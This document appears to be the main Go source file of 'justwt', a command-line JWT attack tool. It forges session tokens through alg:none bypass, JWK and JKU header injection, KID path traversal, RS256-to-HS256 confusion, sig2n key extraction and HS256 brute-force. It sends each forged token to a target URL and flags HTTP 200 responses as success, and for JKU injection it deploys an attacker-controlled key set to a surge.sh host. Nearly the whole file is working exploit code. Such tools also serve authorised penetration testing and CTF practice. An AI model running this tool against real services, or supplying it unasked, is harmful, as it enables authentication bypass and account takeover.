package main

import (
	"crypto/rsa"
	"encoding/base64"
	"encoding/json"
	"flag"
	"fmt"
	"os"
	"os/exec"
	"regexp"
	"strings"
)

const (
	Reset     = "\033[0m"
	Bold      = "\033[1m"
	Dim       = "\033[2m"
	Red       = "\033[31m"
	Green     = "\033[32m"
	Yellow    = "\033[33m"
	Purple    = "\033[35m"
	Cyan      = "\033[36m"
	BrightPpl = "\033[95m"
)

func printBanner() {
	banner := `
  ___ _   _ _____ _____   _    _______ _____ _____  _   __  _____ _____ _   __ _____ _   _  _____ 
  |_  | | | /  ___|_   _| | |  | | ___ \  ___/  __ \| | / / |_   _|  _  | | / /|  ___| \ | |/  ___|
    | | | | \ '--.  | |   | |  | | |_/ / |__ | /  \/| |/ /    | | | | | | |/ / | |__ |  \| |\ '---. 
    | | | | |'--. \ | |   | |/\| |    /|  __|| |    |    \    | | | | | |    \ |  __|| . ' | '---. \
/\__/ / |_| /\__/ / | |   \  /\  / |\ \| |___| \__/\| |\  \   | | \ \_/ / |\  \| |___| |\  |/\__/ /
\____/ \___/\____/  \_/    \/  \/\_| \_\____/ \____/\_| \_/   \_/  \___/\_| \_/\____/\_| \_/\____/ 
`
	fmt.Print(BrightPpl + banner + Reset)
}

func main() {
	jwtInput := flag.String("jwt", "", "Input JWT token")
	payloadInput := flag.String("payload", "", "JSON payload to inject")

	attackAll := flag.Bool("all", false, "Run ALL attack types")
	attackNone := flag.Bool("none", false, "Alg:none bypass")
	attackJWK := flag.Bool("jwk", false, "JWK header injection")
	attackJKU := flag.Bool("jku", false, "JKU header injection")
	attackKID := flag.Bool("kid", false, "KID path traversal")
	attackAlg := flag.Bool("alg-confusion", false, "Algorithm confusion RS256->HS256")
	attackBrute := flag.Bool("brute", false, "HS256 brute-force")
	attackPayload := flag.Bool("payload-only", false, "Change payload, keep signature")

	targetURL := flag.String("url", "", "Target URL")
	secretTarget := flag.String("target", "", "File/URL as HMAC secret")
	sig2nToken2 := flag.String("sig2n-token2", "", "2nd JWT for sig2n extraction")
	cookieName := flag.String("cookie", "session", "Cookie name")
	jkuURL := flag.String("jku-url", "", "JKU endpoint URL")
	jkuEncode := flag.Bool("jku-encode", false, "Base64 encode JKU value")
	privateKeyFile := flag.String("private-key", "", "Private key PEM file for signing")
	wordlist := flag.String("wordlist", "", "Wordlist for brute-force")
	surgeName := flag.String("surge-name", "", "Custom surge.sh subdomain (e.g. httpcats)")
	verbose := flag.Bool("v", false, "Verbose mode")

	flag.Usage = func() {
		fmt.Fprintf(os.Stderr, "\nUsage: justwt -jwt <TOKEN> -payload '<JSON>' -url <URL> <attacks> [options]\n\n")
		fmt.Fprintf(os.Stderr, "%s[REQUIRED]%s\n", Bold, Reset)
		fmt.Fprintf(os.Stderr, "  -jwt <TOKEN>       JWT token to test\n")
		fmt.Fprintf(os.Stderr, "  -payload '<JSON>'  JSON payload to inject\n")
		fmt.Fprintf(os.Stderr, "  -url <URL>         Target URL\n\n")
		fmt.Fprintf(os.Stderr, "%s[ATTACKS]%s\n", Bold, Reset)
		fmt.Fprintf(os.Stderr, "  -all          Run all attack types\n")
		fmt.Fprintf(os.Stderr, "  -payload-only Change payload, keep signature\n")
		fmt.Fprintf(os.Stderr, "  -none         Alg:none bypass\n")
		fmt.Fprintf(os.Stderr, "  -brute        HS256 brute-force\n")
		fmt.Fprintf(os.Stderr, "  -jwk          JWK injection\n")
		fmt.Fprintf(os.Stderr, "  -jku          JKU injection\n")
		fmt.Fprintf(os.Stderr, "  -kid          KID path traversal\n")
		fmt.Fprintf(os.Stderr, "  -alg-confusion RS256->HS256 confusion\n\n")
		fmt.Fprintf(os.Stderr, "%s[OPTIONS]%s\n", Bold, Reset)
		fmt.Fprintf(os.Stderr, "  -target <URL>      Secret for alg-confusion\n")
		fmt.Fprintf(os.Stderr, "  -sig2n-token2 <JWT> 2nd JWT for sig2n\n")
		fmt.Fprintf(os.Stderr, "  -cookie <name>     Cookie name (default: session)\n")
		fmt.Fprintf(os.Stderr, "  -jku-url <URL>     JKU endpoint\n")
		fmt.Fprintf(os.Stderr, "  -jku-encode        Base64 encode JKU\n")
		fmt.Fprintf(os.Stderr, "  -wordlist <path>   Brute-force wordlist\n")
		fmt.Fprintf(os.Stderr, "  -surge-name <name> Surge.sh subdomain (e.g. httpcats)\n")
		fmt.Fprintf(os.Stderr, "  -v                 Verbose output\n")
	}

	flag.Parse()

	printBanner()
	fmt.Fprintf(os.Stdout, "\n%s%sAuthor: buzz | Version: v1.0%s\n\n", BrightPpl, Bold, Reset)

	if *jwtInput == "" || *payloadInput == "" || *targetURL == "" {
		flag.Usage()
		fmt.Fprintf(os.Stderr, "\n%s[!] Error:%s Missing required parameters\n", Yellow, Reset)
		if *jwtInput == "" {
			fmt.Fprintf(os.Stderr, "  - -jwt <TOKEN> required\n")
		}
		if *payloadInput == "" {
			fmt.Fprintf(os.Stderr, "  - -payload '<JSON>' required\n")
		}
		if *targetURL == "" {
			fmt.Fprintf(os.Stderr, "  - -url <URL> required\n")
		}
		fmt.Fprintf(os.Stderr, "\n")
		os.Exit(1)
	}

	anyAttack := *attackAll || *attackNone || *attackJWK || *attackJKU || *attackKID || *attackAlg || *attackBrute || *attackPayload
	if !anyAttack {
		flag.Usage()
		fmt.Fprintf(os.Stderr, "\n%s[!] Error:%s You must select at least one attack type\n", Yellow, Reset)
		fmt.Fprintf(os.Stderr, "  Use -all for all attacks or choose specific ones\n\n")
		os.Exit(1)
	}

	var payloadCompact string
	var data map[string]interface{}
	if err := json.Unmarshal([]byte(*payloadInput), &data); err == nil {
		compact, _ := json.Marshal(data)
		payloadCompact = string(compact)
	} else {
		payloadCompact = *payloadInput
	}

	hBase64, pBase64, sig, err := DecodeJWT(*jwtInput)
	if err != nil {
		fmt.Fprintf(os.Stderr, "%s[x] Invalid JWT: %v%s\n", Red, err, Reset)
		os.Exit(1)
	}

	header, err := Base64URLDecode(hBase64)
	if err != nil {
		fmt.Fprintf(os.Stderr, "%s[x] Decode header failed: %v%s\n", Red, err, Reset)
		os.Exit(1)
	}

	var originalPayload string
	if payloadCompact != "" {
		originalPayload = payloadCompact
	} else {
		originalPayload, err = Base64URLDecode(pBase64)
		if err != nil {
			fmt.Fprintf(os.Stderr, "%s[x] Decode payload failed: %v%s\n", Red, err, Reset)
			os.Exit(1)
		}
	}

	fmt.Printf("  %s[~] Header:%s  %s\n", BrightPpl, Reset, header)
	fmt.Printf("  %s[~] Payload:%s %s\n", BrightPpl, Reset, originalPayload)
	if *targetURL != "" {
		fmt.Printf("  %s[~] Target:%s  %s\n", BrightPpl, Reset, *targetURL)
	}
	fmt.Println()

	var allResults []MutationResult

	var foundSecret string
	var signingKey *rsa.PrivateKey

	if *attackPayload || *attackAll {
		printSection("PAYLOAD MUTATION")
		payloadMut := &PayloadMutator{
			CustomPayload:     payloadCompact,
			OriginalSignature: sig,
			FoundSecret:       foundSecret,
		}
		if res, mErr := payloadMut.Mutate(header, ""); mErr == nil {
			allResults = append(allResults, res...)
		}
	}

	if *attackNone || *attackAll {
		printSection("ALG:NONE BYPASS")
		noneMut := &NoneMutator{}
		if res, mErr := noneMut.Mutate(header, originalPayload); mErr == nil {
			allResults = append(allResults, res...)
		}
	}

	if *attackBrute || *attackAll {
		printSection("BRUTE FORCE")
		if *wordlist == "" {
			note("[x] Brute-force needs -wordlist")
		} else {
			fmt.Printf("    Wordlist: %s\n", *wordlist)
			parts := strings.Split(*jwtInput, ".")
			if len(parts) == 3 {
				secret, bErr := BruteForceHS256(parts[0], parts[1], parts[2], *wordlist)
				if bErr == nil {
					note(fmt.Sprintf("[+] Secret found: %s", secret))
					foundSecret = secret
					signedToken := SignHS256(header, originalPayload, []byte(secret))
					allResults = append(allResults, MutationResult{
						Label: "Brute-forced (found secret)",
						Token: signedToken,
					})
				} else {
					note("[x] Secret not found")
				}
			}
		}
	}

	var signingKeySource string
	needRSA := *attackAll || *attackJWK || *attackJKU
	if needRSA {
		if *privateKeyFile != "" {
			privateKeyPEM, err := os.ReadFile(*privateKeyFile)
			if err != nil {
				fmt.Fprintf(os.Stderr, "%s[x] Cannot read private key file: %v%s\n", Red, err, Reset)
				os.Exit(1)
			}
			signingKey, err = ParseRSAPrivateKey(privateKeyPEM)
			if err != nil {
				fmt.Fprintf(os.Stderr, "%s[x] Invalid private key format: %v%s\n", Red, err, Reset)
				os.Exit(1)
			}
			signingKeySource = "provided"
		} else {
			var originalHeader map[string]interface{}
			if err := json.Unmarshal([]byte(header), &originalHeader); err == nil {
				if originalJku, ok := originalHeader["jku"].(string); ok && originalJku != "" {
					if fetchedKey, err := FetchPrivateKeyFromJKU(originalJku); err == nil {
						signingKey = fetchedKey
						signingKeySource = "server"
					} else {
						signingKey, err = GetOrGenerateRSAKey("private.pem")
						if err != nil {
							fmt.Fprintf(os.Stderr, "%s[x] RSA generation failed: %v%s\n", Red, err, Reset)
							os.Exit(1)
						}
						signingKeySource = "generated"
					}
				} else {
					signingKey, err = GetOrGenerateRSAKey("private.pem")
					if err != nil {
						fmt.Fprintf(os.Stderr, "%s[x] RSA generation failed: %v%s\n", Red, err, Reset)
						os.Exit(1)
					}
					signingKeySource = "generated"
				}
			}
		}
	}

	if *attackJWK || *attackAll {
		printSection("JWK INJECTION")
		jwkMut := &JwkMutator{CustomPayload: payloadCompact, SigningKey: signingKey}
		if res, mErr := jwkMut.Mutate(header, originalPayload); mErr == nil {
			allResults = append(allResults, res...)
		}
	}

	if *attackJKU || *attackAll {
		printSection("JKU INJECTION")
		switch signingKeySource {
		case "provided":
			note("[+] Using provided private key")
		case "server":
			note("[+] Private key found on server — signing with it")
		default:
			note("[+] Generated RSA key pair — deploying public key to surge.sh")
		}
		jwksJSON := GetJWKSet(&signingKey.PublicKey)
		jwkSingleJSON := GetSingleJWK(&signingKey.PublicKey)
		jwkMinimalJSON := GetJWKMinimal(&signingKey.PublicKey)
		os.MkdirAll("keys", 0755)
		if wErr := os.WriteFile("keys/jwks.json", []byte(jwksJSON), 0644); wErr == nil {
			note("[+] Saved keys/jwks.json (JWKS Set with kid)")
		}
		if wErr := os.WriteFile("keys/jwk.json", []byte(jwkSingleJSON), 0644); wErr == nil {
			note("[+] Saved keys/jwk.json (single JWK with kid)")
		}
		if wErr := os.WriteFile("keys/key.json", []byte(jwkMinimalJSON), 0644); wErr == nil {
			note("[+] Saved keys/key.json (minimal: kty+e+n only)")
		}

		jkuTarget := *jkuURL
		var jkuTargets []string
		if jkuTarget != "" {
			fmt.Printf("\n    %s%sGenerated JWK Set:%s\n", Bold, Yellow, Reset)
			fmt.Println("    " + strings.ReplaceAll(jwksJSON, "\n", "\n    "))
			fmt.Printf("\n    %s%sGenerated Single JWK:%s\n", Bold, Yellow, Reset)
			fmt.Println("    " + strings.ReplaceAll(jwkSingleJSON, "\n", "\n    "))
			fmt.Printf("\n    %s[!] Copy one of these formats to exploit server:%s\n", Yellow, Reset)
			fmt.Printf("        %s%s%s\n\n", Cyan, jkuTarget, Reset)
			fmt.Printf("    %s[?] Press ENTER when uploaded...%s\n", Cyan, Reset)
			fmt.Scanln()
			jkuTargets = append(jkuTargets, deriveJKUVariants(jkuTarget)...)
		} else {
			note("[~] Auto-deploying to surge.sh...")
			surgeURL, surgeErr := DeployToSurge(*surgeName)
			if surgeErr != nil {
				note(fmt.Sprintf("[x] Auto-deploy failed: %v", surgeErr))
				note("[!] Upload jwks.json or jwk.json manually with -jku-url")
			} else {
				httpURL := strings.Replace(surgeURL, "https://", "http://", 1)
				jkuTargets = []string{
					surgeURL + "/jwks.json",
					surgeURL + "/jwk.json",
					surgeURL + "/key.json",
					httpURL + "/jwks.json",
					httpURL + "/jwk.json",
					httpURL + "/key.json",
				}
				note(fmt.Sprintf("[+] Deployed! %s", surgeURL))
				note(fmt.Sprintf("[+] Testing both http:// and https:// variants"))
			}
		}

		for _, target := range jkuTargets {
			jkuForMutator := target
			if *jkuEncode {
				encodedJKU := base64.URLEncoding.EncodeToString([]byte(target))
				fmt.Printf("\n    %s[~] JKU Encoding Enabled:%s\n", BrightPpl, Reset)
				fmt.Printf("        Original: %s\n", target)
				fmt.Printf("        Encoded:  %s%s%s\n\n", Yellow, encodedJKU, Reset)
				jkuForMutator = encodedJKU
			}

			jkuMut := &JkuMutator{CustomPayload: payloadCompact, JkuURL: jkuForMutator, SigningKey: signingKey}
			if res, mErr := jkuMut.Mutate(header, originalPayload); mErr == nil {
				for i := range res {
					if strings.HasSuffix(target, "/key.json") {
						res[i].Label = "JKU (Minimal JWK)"
					} else if strings.HasSuffix(target, "/jwk.json") {
						res[i].Label = "JKU (Single JWK)"
					} else {
						res[i].Label = "JKU (JWKS Set)"
					}
				}
				allResults = append(allResults, res...)
			}
		}

		// Also try the original JKU from the input token.
		var originalHeader map[string]interface{}
		if err := json.Unmarshal([]byte(header), &originalHeader); err == nil {
			if originalJku, ok := originalHeader["jku"].(string); ok && originalJku != "" {
				jkuMutOrig := &JkuMutator{CustomPayload: payloadCompact, JkuURL: originalJku, SigningKey: signingKey}
				if res, mErr := jkuMutOrig.Mutate(header, originalPayload); mErr == nil {
					for i := range res {
						res[i].Label = "JKU (Original site endpoint)"
					}
					allResults = append(allResults, res...)
				}
			}
		}
	}

	if *attackKID || *attackAll {
		printSection("KID PATH TRAVERSAL")
		kidMut := &KidMutator{CustomPayload: payloadCompact}
		if res, mErr := kidMut.Mutate(header, originalPayload); mErr == nil {
			allResults = append(allResults, res...)
		}
	}

	if *attackAlg || *attackAll {
		var allPubKeys [][]byte

		// Auto-detect: if the original token has a JKU, fetch the public key from it
		var originalHeader map[string]interface{}
		if err := json.Unmarshal([]byte(header), &originalHeader); err == nil {
			if jkuVal, ok := originalHeader["jku"].(string); ok && jkuVal != "" {
				pubPEM, fetchErr := FetchPubKeyFromJKU(jkuVal)
				if fetchErr == nil {
					allPubKeys = append(allPubKeys, pubPEM)
					note(fmt.Sprintf("[+] Fetched public key from JKU: %s", jkuVal))
				}
			}
		}

		if *sig2nToken2 != "" {
			printSection("SIG2N EXTRACTION")
			extractedKeys, err := ExtractPublicKeysWithSig2n(*jwtInput, *sig2nToken2)
			if err != nil {
				note(fmt.Sprintf("[x] Extraction failed: %v", err))
			} else {
				allPubKeys = extractedKeys
				note(fmt.Sprintf("[+] Extracted %d key(s)", len(extractedKeys)))
			}
		}

		if len(allPubKeys) == 0 && *secretTarget == "" {
			note("[!] Alg confusion needs -sig2n-token2 or -target")
		} else {
			printSection("ALG CONFUSION")

			if len(allPubKeys) > 0 {
				for idx, key := range allPubKeys {
					algMut := &AlgConfusionMutator{CustomPayload: payloadCompact, PublicKey: key, TargetURL: *secretTarget}
					if res, mErr := algMut.Mutate(header, originalPayload); mErr == nil {
						for i := range res {
							res[i].Label = fmt.Sprintf("Alg Confusion (PubKey #%d)", idx+1)
						}
						allResults = append(allResults, res...)
					} else {
						note(fmt.Sprintf("[~] Key #%d error: %v", idx+1, mErr))
					}
				}
			} else if *secretTarget != "" {
				algMut := &AlgConfusionMutator{CustomPayload: payloadCompact, PublicKey: nil, TargetURL: *secretTarget}
				if res, mErr := algMut.Mutate(header, originalPayload); mErr == nil {
					allResults = append(allResults, res...)
				} else {
					note(fmt.Sprintf("[x] Error: %v", mErr))
				}
			}
		}
	}

	fmt.Println()
	fmt.Printf("  %s%s╔════════════════════════════════════╗%s\n", Bold, Purple, Reset)
	fmt.Printf("  %s%s║          RESULTS (%d TOKENS)       ║%s\n", Bold, Purple, len(allResults), Reset)
	fmt.Printf("  %s%s╚════════════════════════════════════╝%s\n", Bold, Purple, Reset)

	successCount := 0
	failCount := 0
	statusMap := make(map[int]int)

	for i, res := range allResults {
		var status int
		var length int64
		var httpErr error

		if *targetURL != "" {
			status, length, httpErr = SendRequest(*targetURL, *cookieName, res.Token)
			if httpErr == nil {
				statusMap[status]++
			}
		}

		isSuccess := status == 200
		shouldShow := *verbose || *targetURL == "" || isSuccess

		if !shouldShow {
			failCount++
			continue
		}

		if isSuccess {
			successCount++
		}

		fmt.Println()
		statusIcon := "●"
		statusColor := Dim
		if *targetURL != "" {
			if isSuccess {
				statusIcon = "✓"
				statusColor = Green
			} else {
				statusIcon = "✗"
				statusColor = Red
			}
		}

		fmt.Printf("  %s%s%s %s#%-3d%s %s%s%s\n", statusColor, Bold, statusIcon, Cyan, i+1, Reset, Yellow, res.Label, Reset)
		fmt.Printf("       %s\n", res.Token)

		if *verbose {
			hEnc, _, _, decErr := DecodeJWT(res.Token)
			if decErr == nil {
				hDec, _ := Base64URLDecode(hEnc)
				fmt.Printf("       %sHeader: %s%s\n", Dim, hDec, Reset)
			}
		}

		if *targetURL != "" {
			if httpErr != nil {
				fmt.Printf("       %s[x] %v%s\n", Red, httpErr, Reset)
			} else if isSuccess {
				fmt.Printf("       %s[+] HTTP %d | Length: %d ← SUCCESS%s\n", Green, status, length, Reset)
			} else {
				fmt.Printf("       %s[~] HTTP %d | Length: %d%s\n", Dim, status, length, Reset)
			}
		}
	}

	fmt.Println()
	fmt.Printf("  %s%s════════════════════════════════════%s\n", Bold, Purple, Reset)
	fmt.Printf("  Total: %d tokens\n", len(allResults))

	if *targetURL != "" {
		if successCount > 0 {
			fmt.Printf("  %s[+] %d SUCCESS (HTTP 200)%s\n", Green, successCount, Reset)
		}
		if failCount > 0 && !*verbose {
			fmt.Printf("  %s[~] %d failed (use -v)%s\n", Dim, failCount, Reset)
		}
		if successCount == 0 {
			fmt.Printf("  %s[x] No HTTP 200. Status: %s", Red, Reset)
			for s, count := range statusMap {
				fmt.Printf("[%d: %dx] ", s, count)
			}
			fmt.Println()
		}
	}
	fmt.Println()
}

func printSection(name string) {
	fmt.Printf("\n  %s%s▶ %s%s\n", Bold, BrightPpl, name, Reset)
}

func note(msg string) {
	fmt.Printf("    %s%s\n", msg, Reset)
}

func deriveJKUVariants(inputURL string) []string {
	seen := make(map[string]struct{})
	add := func(v string, out *[]string) {
		if v == "" {
			return
		}
		if _, ok := seen[v]; ok {
			return
		}
		seen[v] = struct{}{}
		*out = append(*out, v)
	}

	var targets []string
	add(inputURL, &targets)

	if strings.HasSuffix(inputURL, "/jwks.json") {
		add(strings.TrimSuffix(inputURL, "/jwks.json")+"/jwk.json", &targets)
		return targets
	}

	if strings.HasSuffix(inputURL, "/jwk.json") {
		add(strings.TrimSuffix(inputURL, "/jwk.json")+"/jwks.json", &targets)
		return targets
	}

	lastSlash := strings.LastIndex(inputURL, "/")
	if lastSlash == -1 {
		return targets
	}
	base := inputURL[:lastSlash]
	add(base+"/jwks.json", &targets)
	add(base+"/jwk.json", &targets)

	return targets
}

func DeployToSurge(customName string) (string, error) {
	var domain string
	if customName != "" {
		domain = customName + ".surge.sh"
	} else {
		domain = fmt.Sprintf("jwt-exploit-%d.surge.sh", os.Getpid())
	}

	cmd := exec.Command("surge", "keys", domain)
	output, err := cmd.CombinedOutput()
	if err != nil {
		return "", fmt.Errorf("surge failed")
	}

	re := regexp.MustCompile(`(?:https?://)?([a-zA-Z0-9.-]+\.surge\.sh)`)
	matches := re.FindStringSubmatch(string(output))
	if len(matches) < 2 {
		return "", fmt.Errorf("surge URL not found")
	}

	url := matches[1]
	if !strings.HasPrefix(url, "http://") && !strings.HasPrefix(url, "https://") {
		url = "https://" + url
	}
	return url, nil
}
